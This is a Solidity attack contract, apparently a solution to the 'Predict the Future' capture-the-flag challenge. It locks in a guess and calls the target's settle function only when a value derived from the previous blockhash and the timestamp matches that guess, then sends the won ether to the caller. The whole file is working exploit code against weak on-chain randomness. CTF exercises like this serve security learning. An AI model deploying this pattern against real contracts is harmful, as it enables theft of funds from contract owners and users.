// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface PredictTheFutureChallenge {
    function settle() external;

    function lockInGuess(uint8 n) external payable;
}

contract AttackPredictTheFuture {
    address public target;

    constructor(address _target) {
        target = _target;
    }

    // we guess any number we want between 0 and 9
    function guess() public payable {
        require(msg.value == 1 ether);
        PredictTheFutureChallenge(target).lockInGuess{value: msg.value}(8);
    }

    // we only call settle if the answer will be correct
    function attack() public {
        uint8 answer = uint8(
            uint256(
                keccak256(
                    abi.encodePacked(
                        blockhash(block.number - 1),
                        block.timestamp
                    )
                )
            )
        ) % 10;
        require(answer == 8);
        PredictTheFutureChallenge(target).settle();
        payable(msg.sender).transfer(address(this).balance);
    }

    // so we can receive the ether
    receive() external payable {}
}
